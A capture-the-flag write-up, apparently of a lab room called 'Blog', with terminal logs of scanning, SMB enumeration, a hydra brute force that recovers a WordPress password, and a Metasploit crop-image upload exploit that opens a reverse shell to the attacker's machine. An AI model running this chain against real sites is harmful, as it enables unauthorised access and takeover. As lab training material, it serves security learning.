# Blog 
*It's 9 o'clock on a Saturday...*

10.114.94.220 - atk box
10.114.140.65 - blog.thm

/etc/hosts:
`10.114.140.65		blog.thm` added


```
root@ip-10-114-94-220:~# nmap -sS blog.thm -p- -vv -n -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-18 11:36 UTC
Initiating SYN Stealth Scan at 11:36
Scanning blog.thm (10.114.140.65) [65535 ports]
Discovered open port 80/tcp on 10.114.140.65
Discovered open port 139/tcp on 10.114.140.65
Discovered open port 22/tcp on 10.114.140.65
Discovered open port 445/tcp on 10.114.140.65
Completed SYN Stealth Scan at 11:36, 2.52s elapsed (65535 total ports)
Nmap scan report for blog.thm (10.114.140.65)
Host is up, received user-set (0.00040s latency).
Scanned at 2026-07-18 11:36:21 UTC for 2s
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.75 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)
root@ip-10-114-94-220:~# 
```

```
root@ip-10-114-94-220:~# nmap -sC -sV -O blog.thm -p22,80,139,445 -n -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-18 11:37 UTC
Nmap scan report for blog.thm (10.114.140.65)
Host is up (0.00088s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 3.10 - 3.13 (94%), Linux 3.8 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2026-07-18T11:37:37+00:00
| smb2-time: 
|   date: 2026-07-18T11:37:37
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.55 seconds
root@ip-10-114-94-220:~# 
```

### SMB

```
root@ip-10-114-94-220:~# smbclient -L //blog.thm --user=guest -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	BillySMB        Disk      Billy's local SMB Share
	IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
root@ip-10-114-94-220:~# smbclient //blog.thm/BillySMB --user=guest -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 18:17:05 2020
  ..                                  D        0  Tue May 26 17:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 18:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 18:13:45 2020
  check-this.png                      N     3082  Tue May 26 18:13:43 2020

		15413192 blocks of size 1024. 9788748 blocks available
smb: \> get Alice-White-Rabbit.jpg 
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (603.6 KiloBytes/sec) (average 603.6 KiloBytes/sec)
smb: \> get tswift.mp4 
getting file \tswift.mp4 of size 1236733 as tswift.mp4 (46451.6 KiloBytes/sec) (average 15504.3 KiloBytes/sec)
smb: \> get check-this.png 
getting file \check-this.png of size 3082 as check-this.png (601.9 KiloBytes/sec) (average 14627.7 KiloBytes/sec)
smb: \> exit
root@ip-10-114-94-220:~# 
```

downloaded:
```
root@ip-10-114-94-220:~/ctf# ls
Alice-White-Rabbit.jpg  check-this.png  tswift.mp4
root@ip-10-114-94-220:~/ctf# zbarimg check-this.png 
QR-Code:https://qrgo.page.link/M6dE
scanned 1 barcode symbols from 1 images in 0.01 seconds

root@ip-10-114-94-220:~/ctf# 
```

Let's check it out!
(pho1)

We didn't start the fire! It was always burning, since the world's been turning!"

### The rabbit hole

```
root@ip-10-114-94-220:~/ctf# steghide extract -sf Alice-White-Rabbit.jpg 
Enter passphrase: 
wrote extracted data to "rabbit_hole.txt".
root@ip-10-114-94-220:~/ctf# ls
Alice-White-Rabbit.jpg  check-this.png  rabbit_hole.txt  tswift.mp4
root@ip-10-114-94-220:~/ctf# cat rabbit_hole.txt 
You've found yourself in a rabbit hole, friend.
root@ip-10-114-94-220:~/ctf# 
```

That's what I thought...

And the tswift.mp4 is just a funny music video of Taylor Swift's song.

Let's go back to the site.

### /wp-login

Navigate to: `http://blog.thm/robots.txt`
```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```
When we go to `/wp-admin/admin-ajax.php` we are presented with nothing. .php file can't be loaded and it returning HTTP Code 400.

Instead, if we go to `/wp-admin`, we're redirected to `/wp-login`. But we don't have the username!

(pho2)

On the site we can see a post from Billy Joel's mom. 
If we click on her name, we are redirected to her profile. It's under `http://blog.thm/author/kwheel/`. So we managed to get her username! 

> Billy Joel is 'bjoel` but it's harder to break into that account..

### Cracking the password

(pho4)

```
root@ip-10-114-94-220:~/ctf# hydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.114.140.65 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:S=302" -f -v -I
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-18 12:05:23
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.114.140.65:80/wp-login.php:log=^USER^&pwd=^PASS^:S=302
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 2389.00 tries/min, 2389 tries in 00:01h, 14342009 to do in 100:04h, 16 active
[80][http-post-form] host: 10.114.140.65   login: kwheel   password: cutiepie1
[STATUS] attack finished for 10.114.140.65 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-18 12:06:37
root@ip-10-114-94-220:~/ctf# 
```

hydra options explained!~!:
- `-l`
- `-P`
- `http-post-form`
- `/wp-login.php`
- `log=^USER^&pwd=^PASS^`
- `S=302`
- `-f`
- `-v`
- `-I`

password found mission complete

`login: kwheel   password: cutiepie1`

we loggin!

Found out I couldn't do reverse shell on that site..

```
root@ip-10-114-94-220:~/ctf# msfconsole

msf > search wordpress 5.0

Matching Modules
================

   #   Full Name                                                Disclosure Date  Rank       Check  Name
   -   ---------                                                ---------------  ----       -----  ----
   0   exploit/multi/http/wp_crop_rce                           2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload

...
msf > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
USERNAME => kwheel
msf exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
PASSWORD => cutiepie1
msf exploit(multi/http/wp_crop_rce) > set RHOSTS blog.thm
RHOSTS => blog.thm
msf exploit(multi/http/wp_crop_rce) > run
```

The session kept dying after running reverse shell. I've somewhat fixed it by chaning the payload:
```
msf exploit(multi/http/wp_crop_rce) > set payload php/reverse_php
payload => php/reverse_php
```

```
msf exploit(multi/http/wp_crop_rce) > run
[*] Started reverse TCP handler on 10.114.94.220:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Command shell session 2 opened (10.114.94.220:4444 -> 10.114.140.65:36678) at 2026-07-18 12:32:52 +0000
^C[-] Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted
msf exploit(multi/http/wp_crop_rce) > sessions

Active sessions
===============

  Id  Name  Type           Information  Connection
  --  ----  ----           -----------  ----------
  2         shell php/php               10.114.94.220:4444 -> 10.114.140.65:36678 (10.114.140.65)

```

> Note that I had to use CTRL+C after session was created. Exploit was successful (even though the terminal said otherwise)

```
msf exploit(multi/http/wp_crop_rce) > session 2
[-] Unknown command: session. Did you mean sessions? Run the help command for more details.
msf exploit(multi/http/wp_crop_rce) > sessions -i 2
[*] Starting interaction with 2...

whoami
www-data
```

The session is very unstable. hard to continue
